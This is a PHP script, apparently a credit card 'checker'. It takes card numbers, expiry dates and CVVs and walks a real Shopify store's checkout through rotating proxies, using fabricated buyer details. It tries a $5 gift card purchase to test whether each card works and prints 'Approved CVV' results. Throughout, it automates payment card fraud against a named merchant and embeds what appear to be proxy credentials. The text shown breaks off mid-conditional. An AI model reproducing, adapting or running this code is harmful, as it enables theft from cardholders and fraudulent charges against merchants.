<?php 


error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = $_GET['lista'];
preg_match_all('/\d+/i', $lista, $m);
$cc = $m[0][0];
$mes = $m[0][1];
$ano = $m[0][2];
$cvv = $m[0][3];

$lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';

$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

if (number_format($mes) < 10){$mes = str_replace("0", "", $mes);};

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

function Dabilol($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  $str = trim(strip_tags($str[0]));
  return $str;
}

function multi_Dabilol($string, $start, $end, $index){
  return explode($end, explode($start, $string)[$index])[0];
}

function genstr($length){
  $result = '';
  for ($i=0; $i < $length ; $i++) { 
    $a = '1234567890';
    $a = str_split($a);
    $result .= $a[array_rand($a)];
  }
  return $result;
}

# ------------- Bin ------------- #

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
$scheme = $fim['scheme'];
$funding = $fim['prepaid'];
$scheme = ucfirst($scheme);

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('Dabilol'));
$last = ucfirst(str_shuffle('pro'));
$email = "Dabilol".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

# -------------------------------------------------------------------- [PROXY SECTION] --------------------------------------------------------------------- #

$rotate = array(
'hjtenkmo-rotate:y0fvre8874se',
'byoxuesn-rotate:zmwyjxndsvpr'
);

$userpwd = $rotate[array_rand($rotate)];

# ------------------------------------------------------------------------- [1 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://www.corporatetraditions.com/products/google-play-5-gift-card?_pos=1&_sid=a3c67ba7d&_ss=r');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: www.corporatetraditions.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.corporatetraditions.com/search?q=google+play';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$api_key = Dabilol($curl, "apiKey: '","'");

# ------------------------------------------------------------------------- [2 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/api/2021-07/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: *';
$headers[] = 'Referer: https://www.corporatetraditions.com/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'X-SDK-Variant: javascript';
$headers[] = 'X-SDK-Version: 2.12.0';
$headers[] = 'X-Shopify-Storefront-Access-Token: '.$api_key.'';
$headers[] = 'X-SDK-Variant-Source: buy-button-js';
$headers[] = 'Origin: https://www.corporatetraditions.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"fragment VariantFragment on ProductVariant  { id,title,price,priceV2 { amount,currencyCode },presentmentPrices (first: 20) { pageInfo { hasNextPage,hasPreviousPage },edges { node { price { amount,currencyCode },compareAtPrice { amount,currencyCode } } } },weight,available: availableForSale,sku,compareAtPrice,compareAtPriceV2 { amount,currencyCode },image { id,src: originalSrc,altText },selectedOptions { name,value },unitPrice { amount,currencyCode },unitPriceMeasurement { measuredType,quantityUnit,quantityValue,referenceUnit,referenceValue } },fragment DiscountApplicationFragment on DiscountApplication  { __typename,targetSelection,allocationMethod,targetType,value { ... on MoneyV2 { amount,currencyCode },... on PricingPercentageValue { percentage } },... on ManualDiscountApplication { title,description },... on DiscountCodeApplication { code,applicable },... on ScriptDiscountApplication { description },... on AutomaticDiscountApplication { title } },fragment AppliedGiftCardFragment on AppliedGiftCard  { amountUsedV2 { amount,currencyCode },balanceV2 { amount,currencyCode },presentmentAmountUsed { amount,currencyCode },id,lastCharacters },fragment VariantWithProductFragment on ProductVariant  { ...VariantFragment,product { id,handle } },fragment UserErrorFragment on UserError  { field,message },fragment CheckoutUserErrorFragment on CheckoutUserError  { field,message,code },fragment MailingAddressFragment on MailingAddress  { id,address1,address2,city,company,country,firstName,formatted,lastName,latitude,longitude,phone,province,zip,name,countryCode: countryCodeV2,provinceCode },fragment CheckoutFragment on Checkout  { id,ready,requiresShipping,note,paymentDue,paymentDueV2 { amount,currencyCode },webUrl,orderStatusUrl,taxExempt,taxesIncluded,currencyCode,totalTax,totalTaxV2 { amount,currencyCode },lineItemsSubtotalPrice { amount,currencyCode },subtotalPrice,subtotalPriceV2 { amount,currencyCode },totalPrice,totalPriceV2 { amount,currencyCode },completedAt,createdAt,updatedAt,email,discountApplications (first: 10) { pageInfo { hasNextPage,hasPreviousPage },edges { node { __typename,...DiscountApplicationFragment } } },appliedGiftCards { ...AppliedGiftCardFragment },shippingAddress { ...MailingAddressFragment },shippingLine { handle,price,priceV2 { amount,currencyCode },title },customAttributes { key,value },order { id,processedAt,orderNumber,subtotalPrice,subtotalPriceV2 { amount,currencyCode },totalShippingPrice,totalShippingPriceV2 { amount,currencyCode },totalTax,totalTaxV2 { amount,currencyCode },totalPrice,totalPriceV2 { amount,currencyCode },currencyCode,totalRefunded,totalRefundedV2 { amount,currencyCode },customerUrl,shippingAddress { ...MailingAddressFragment },lineItems (first: 250) { pageInfo { hasNextPage,hasPreviousPage },edges { cursor,node { title,variant { ...VariantWithProductFragment },quantity,customAttributes { key,value } } } } },lineItems (first: 250) { pageInfo { hasNextPage,hasPreviousPage },edges { cursor,node { id,title,variant { ...VariantWithProductFragment },quantity,customAttributes { key,value },discountAllocations { allocatedAmount { amount,currencyCode },discountApplication { __typename,...DiscountApplicationFragment } } } } } },mutation ($input:CheckoutCreateInput!)  { checkoutCreate (input: $input) { userErrors { ...UserErrorFragment },checkoutUserErrors { ...CheckoutUserErrorFragment },checkout { ...CheckoutFragment } } }","variables":{"input":{"lineItems":[{"variantId":"Z2lkOi8vc2hvcGlmeS9Qcm9kdWN0VmFyaWFudC8zMTc3Mjg5NzUwOTQ3OQ==","quantity":1}]}}}');
$curl = curl_exec($ch);
curl_close($ch);
$id0 = Dabilol($curl, 'myshopify.com\/','\/');
$id1 = Dabilol($curl, '\/checkouts\/','?key=');
$id2 = Dabilol($curl, '?key=','"');

# ------------------------------------------------------------------------- [3 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'?key='.$id2.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.corporatetraditions.com/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$auth1 = Dabilol($curl, 'input type="hidden" name="authenticity_token" value="','"');

# ------------------------------------------------------------------------- [4 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://corporate-traditions.myshopify.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$auth1.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bfirst_name%5D='.$name.'&checkout%5Bbilling_address%5D%5Blast_name%5D='.$last.'&checkout%5Bbilling_address%5D%5Bcompany%5D='.$name.'&checkout%5Bbilling_address%5D%5Baddress1%5D='.urlencode($city).'&checkout%5Bbilling_address%5D%5Baddress2%5D=23&checkout%5Bbilling_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bprovince%5D='.$statee.'&checkout%5Bbilling_address%5D%5Bzip%5D='.$zip.'&checkout%5Bbilling_address%5D%5Bphone%5D=%28856%29+'.rand(111, 999).'-'.rand(1111, 9999).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1212&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl = curl_exec($ch);
curl_close($ch);

# ------------------------------------------------------------------------- [5 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'?previous_step=contact_information&step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$auth2 = Dabilol($curl, 'input type="hidden" name="authenticity_token" value="','"');
$gate = Dabilol($curl, 'data-select-gateway="','"');

# ------------------------------------------------------------------------- [6 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc1.' '.$cc2.' '.$cc3.' '.$cc4.'","name":"'.$name.' '.$last.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"corporate-traditions.myshopify.com"}');
$curl = curl_exec($ch);
curl_close($ch);
$id = json_decode($curl, 1)['id'];

# ------------------------------------------------------------------------- [7 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://corporate-traditions.myshopify.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$auth2.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D='.$gate.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1212&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl = curl_exec($ch);
curl_close($ch);

# ------------------------------------------------------------------------- [8 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'/processing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

# ------------------------------------------------------------------------- [9 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

# ------------------------------------------------------------------------ [10 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result = curl_exec($ch);
curl_close($ch);
$message = Dabilol($result, 'class="notice__content"><p class="notice__text">','</p>');

# ----------------------------------------------------------------------- [RESPONSES] ---------------------------------------------------------------------- #

if
(strpos($result,  'Thank you') || strpos($result, 'Your order is confirmed')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Successfully Charged $5</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
} 
elseif
(strpos($result,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  "incorrect_zip")) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  '"type":"one-time"')) {
